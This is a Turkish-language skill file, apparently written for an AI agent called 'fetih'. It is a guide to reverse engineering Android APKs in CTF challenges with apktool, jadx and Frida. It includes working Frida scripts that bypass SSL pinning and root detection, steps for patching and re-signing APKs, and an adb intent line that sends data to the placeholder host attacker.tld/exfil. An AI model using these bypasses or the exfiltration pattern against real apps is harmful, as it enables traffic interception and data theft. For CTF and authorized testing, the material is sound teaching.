---
name: android-apk-analysis
description: Android APK reverse engineering — apktool, jadx, Frida dynamic instrumentation, native .so analizi, root/SSL bypass
tags: [ctf, rev, android, apk, mobile, apktool, jadx, frida, smali, jni, native, dex, ssl-pinning, root-detection]
triggers:
  - "APK dosyası"
  - "Android challenge"
  - ".apk"
  - "mobile rev"
  - "smali"
  - "dex2jar"
  - "jadx"
  - "apktool"
  - "AndroidManifest"
  - "native library"
  - "libnative.so"
  - "JNI"
  - "Frida"
  - "root detection"
  - "SSL pinning"
  - "Android obfuscation"
difficulty: medium
category: rev
solved_challenges:
  - "HTB Cyber Apocalypse 2024 - Android (jadx + smali)"
  - "PicoCTF 2023 - Android Dropper (apktool unpack)"
  - "Google CTF 2023 - droid challenges (Frida hook)"
  - "DEF CON CTF Quals 2022 - mobile challenges"
related_skills:
  - elf-static-analysis
  - z3-constraint-solving
  - anti-debug-obfuscation
adapted_for: fetih
---

# Android APK Reverse Engineering — Statik + Dinamik

APK = ZIP arşivi. İçerikte Dalvik bytecode (`classes.dex`), kaynak (`res/`), native lib (`lib/<arch>/*.so`), manifest (`AndroidManifest.xml`). Hedef: flag'i çıkar.

---

## Ne Zaman Kullan

- `.apk` dosyası verilmiş
- "Find the flag inside this Android app"
- Reverse engineering kategorisi + mobile platform
- Yaygın CTF taktikleri: hidden string, JNI native code, server response, encrypted asset

---

## Kurulum

```bash
# Temel araç seti
sudo apt install -y default-jdk python3 unzip
pip install frida-tools

# apktool — decompile/recompile
wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar
echo '#!/bin/sh' > /usr/local/bin/apktool
echo 'java -jar /path/to/apktool_2.9.3.jar "$@"' >> /usr/local/bin/apktool
chmod +x /usr/local/bin/apktool

# jadx — Java decompile (GUI + CLI)
wget https://github.com/skylot/jadx/releases/download/v1.5.0/jadx-1.5.0.zip
unzip jadx-1.5.0.zip -d jadx
ln -s $PWD/jadx/bin/jadx /usr/local/bin/jadx

# dex2jar — alternatif
wget https://github.com/pxb1988/dex2jar/releases/download/v2.4/dex-tools-v2.4.zip

# androguard — Python lib
pip install androguard

# Frida — dynamic instrumentation
pip install frida-tools
# Cihaza server push (genshin/Android emulator)
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"
```

### Emulator (Android Studio AVD)
```bash
# AVD ile testing
emulator -avd Pixel_API_30 -writable-system
adb root
adb remount
```

---

## Statik Analiz Akışı

### 1. APK'yi Aç
```bash
# Method 1: apktool (en kapsamlı)
apktool d -o decoded app.apk

# Method 2: unzip (raw)
unzip app.apk -d app_unzip

# Yapı
ls decoded/
# AndroidManifest.xml  res/  smali/  unknown/  apktool.yml  lib/
```

### 2. Manifest İncele
```bash
cat decoded/AndroidManifest.xml | head -50
```

Önemli alanlar:
```xml
<application
    android:debuggable="true"           <!-- Debug mode aktif mi -->
    android:allowBackup="true"
    android:networkSecurityConfig="@xml/network_security_config">

    <activity android:name=".MainActivity"
              android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

    <activity android:name=".HiddenActivity"
              android:exported="true">   <!-- Hidden activity → direkt çağrı! -->
    </activity>

    <service android:name=".SecretService" />
    <receiver android:name=".BootReceiver" />

    <provider android:name=".DataProvider"
              android:exported="true" />  <!-- Content provider data leak -->
</application>

<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
```

### 3. jadx ile Java Kaynağı
```bash
# CLI
jadx -d jadx_out app.apk
# GUI
jadx-gui app.apk
```

`jadx_out/sources/`'da Java kaynak (geri çevrilmiş) bulunur. Önce paket adına bak:
```bash
find jadx_out/sources -name "MainActivity.java"
grep -r "flag" jadx_out/sources/
grep -r "secret" jadx_out/sources/
grep -r "password" jadx_out/sources/
grep -r "API_KEY" jadx_out/sources/
```

### 4. Smali Bytecode (jadx çözemediği şeyler için)
```bash
# Smali = Dalvik bytecode'un human-readable hali
cat decoded/smali/com/example/app/MainActivity.smali
```

### 5. String Tablosu
```bash
# strings.xml (kaynak string'ler — flag burada olabilir!)
cat decoded/res/values/strings.xml

# Tüm hardcoded string'ler
strings app.apk | grep -i flag
strings decoded/classes.dex | grep -i flag
```

### 6. Native Lib (lib/arm64-v8a/*.so)
```bash
file decoded/lib/arm64-v8a/libnative.so

# ELF olduğu için standart araçlar
strings decoded/lib/arm64-v8a/libnative.so | grep flag

# Ghidra / IDA ile aç (JNI fonksiyonları için)
# Tipik JNI fonksiyon ismi: Java_com_example_app_MainActivity_checkFlag
```

---

## Yaygın CTF Pattern'leri

### Pattern 1 — Hardcoded String
```java
// MainActivity.java
private boolean checkFlag(String input) {
    return input.equals("CTF{android_easy_flag}");
}
```

`grep "CTF{" jadx_out/` yeter.

### Pattern 2 — Encoded String
```java
private String secret = "Q1RGe2VuY29kZWRfZmxhZ30=";  // Base64

byte[] decoded = Base64.decode(secret, 0);
return new String(decoded);
```

`echo "Q1RGe2VuY29kZWRfZmxhZ30=" | base64 -d`.

### Pattern 3 — Multi-Stage Decryption
```java
// XOR ile şifreli
byte[] enc = {0x12, 0x34, 0x56, ...};
byte[] key = {0x41, 0x41, 0x41};
byte[] dec = new byte[enc.length];
for (int i = 0; i < enc.length; i++) {
    dec[i] = enc[i] ^ key[i % key.length];
}
```

Decompile et, key + ciphertext oku, Python'da reproduksiyon yap.

### Pattern 4 — Native (JNI) Check
```java
// MainActivity.java
public native String getFlag();
public native boolean verifyFlag(String input);

static { System.loadLibrary("native"); }
```

`.so` dosyasını Ghidra/IDA'da aç:
- `Java_com_example_app_MainActivity_getFlag` fonksiyonunu bul
- Algoritma decompile et, Python'da reproduce et

### Pattern 5 — Server Response
```java
// HTTP/HTTPS sunucudan flag çekiyor
HttpsURLConnection conn = ...;
conn.setRequestProperty("X-Secret", "magic_value");
// Flag response'da gelir
```

Frida ile hook → request/response intercept.

### Pattern 6 — Frida Dynamic Hook
```javascript
// frida_hook.js
Java.perform(function () {
    var MainActivity = Java.use('com.example.app.MainActivity');

    // checkFlag fonksiyonunu hook et
    MainActivity.checkFlag.implementation = function (input) {
        console.log('[+] checkFlag called with: ' + input);
        var result = this.checkFlag(input);
        console.log('[+] returned: ' + result);
        return true;   // her zaman doğru de
    };

    // Tüm string equality kontrolünü görmek için:
    var String = Java.use('java.lang.String');
    String.equals.implementation = function (other) {
        console.log('equals(' + this + ', ' + other + ')');
        return this.equals(other);
    };
});
```

Kullanım:
```bash
frida -U -f com.example.app -l frida_hook.js --no-pause
```

---

## SSL Pinning Bypass

Bazı uygulamalar Burp/mitmproxy üzerinden trafik göremesin diye cert pinning yapar. Frida ile bypass:

```javascript
// frida_ssl_unpin.js — universal
// https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/
Java.perform(function () {
    // OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function () {
            console.log('[+] SSL pinning bypassed (OkHttp3)');
        };
    } catch (e) {}

    // Conscrypt platform check
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log('[+] verifyChain bypassed');
            return untrustedChain;
        };
    } catch (e) {}
});

// frida -U -f com.example.app -l frida_ssl_unpin.js --no-pause
```

---

## Root Detection Bypass

```javascript
// frida_root_bypass.js
Java.perform(function () {
    var RootChecker = Java.use('com.example.app.RootChecker');
    RootChecker.isRooted.implementation = function () {
        console.log('[+] isRooted() bypassed → false');
        return false;
    };

    // File.exists() ile su binary check bypass
    var File = Java.use('java.io.File');
    File.exists.implementation = function () {
        var path = this.getAbsolutePath();
        if (path.indexOf('su') !== -1 || path.indexOf('busybox') !== -1) {
            console.log('[+] File.exists bypassed: ' + path);
            return false;
        }
        return this.exists();
    };
});
```

---

## Tools Pratikte

### apktool ile patch + rebuild
```bash
# Smali'i edit et (örn. debuggable yap)
apktool d app.apk -o decoded
sed -i 's/android:debuggable="false"/android:debuggable="true"/' decoded/AndroidManifest.xml

# Rebuild
apktool b decoded -o modified.apk

# Sign et (zorunlu — Android imzasız APK yüklenmez)
keytool -genkey -v -keystore my.keystore -alias x -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore my.keystore modified.apk x

# Install
adb install modified.apk
```

### androguard (Python)
```python
from androguard.misc import AnalyzeAPK

a, d, dx = AnalyzeAPK("app.apk")
print('Package:', a.get_package())
print('Permissions:', a.get_permissions())
print('Activities:', a.get_activities())

# Belirli class'ı bul
for cls in dx.get_classes():
    if "MainActivity" in cls.name:
        for meth in cls.get_methods():
            print(meth.name)
            print(meth.get_method().get_source())
```

### Objection (Frida wrapper)
```bash
pip install objection
objection -g com.example.app explore

# Aktif komutlar:
> android sslpinning disable
> android root disable
> android hooking list classes
> android hooking watch class com.example.app.MainActivity
```

---

## Native .so Analizi (JNI)

JNI fonksiyon isim formatı: `Java_<PackageWithUnderscores>_<Class>_<Method>`.

Örnek: `com.example.app.MainActivity.checkFlag` → `Java_com_example_app_MainActivity_checkFlag`.

```bash
# Ghidra/IDA'da .so aç
ghidra decoded/lib/arm64-v8a/libnative.so

# Veya pwntools ile basit decode
objdump -d decoded/lib/arm64-v8a/libnative.so | grep -A 30 "Java_com_example_app"
```

JNI'da `JNIEnv *` ilk argüman, `jobject` ikinci, sonra kullanıcı parametreleri.

```c
// JNI fonksiyon imzası:
JNIEXPORT jboolean JNICALL
Java_com_example_app_MainActivity_checkFlag(JNIEnv *env, jobject thiz, jstring input) {
    const char *input_str = (*env)->GetStringUTFChars(env, input, 0);
    // ... kontrol
    (*env)->ReleaseStringUTFChars(env, input, input_str);
}
```

---

## ContentProvider / Intent Exploitation

`exported="true"` olan ContentProvider'lar dışarıdan çağrılabilir:

```bash
# adb ile direkt query
adb shell content query --uri content://com.example.app.provider/users

# Implicit intent
adb shell am start -a android.intent.action.VIEW \
    -d "https://attacker.tld/exfil?data=secret"
```

---

## Tuzaklar

1. **Multi-DEX:** `classes.dex` + `classes2.dex` + ... — hepsini incele.
2. **R8/ProGuard obfuscation:** Sınıf isimleri `a, b, c` olur. `jadx --deobf` deobfuscation dener.
3. **String encryption:** Stringler runtime'da decode edilir. Frida ile `String.<init>` veya `StringBuilder` hook → decoded string yakalar.
4. **Native code anti-debug:** `ptrace`, `/proc/self/status TracerPid` check. Frida ile bypass.
5. **APK çift imzalı:** Apksigner ile v2/v3 imza varsa apktool sonrası imza bozulur — `jarsigner` yetmez.
6. **Architecture seç:** Cihazda `arm64-v8a` varsa `lib/arm64-v8a/`'ya bak. Emülatörde `x86_64` da olabilir.
7. **Frida server architecture:** Cihazın CPU'sıyla aynı (`frida-server-15.0.0-android-arm64`).

---

## Cross-Skill Pivot

```
APK challenge → unzip + apktool
            ├── strings.xml + Java code → flag direkt
            ├── Encoded/encrypted → Python reproduce
            ├── Native code → Ghidra + reproduce
            ├── Server check → Frida hook
            ├── SSL pinning → Frida unpin
            ├── Multiple stages → z3-constraint-solving skill
            └── İleri obfuscation → anti-debug-obfuscation skill
```

---

## Ek Kaynaklar

- jadx GitHub: https://github.com/skylot/jadx
- apktool: https://apktool.org/
- Frida codeshare: https://codeshare.frida.re/
- "Android Hacker's Handbook" (kitap)
- HackTricks Android: https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 4aaa5ad6a47fb09a
-->

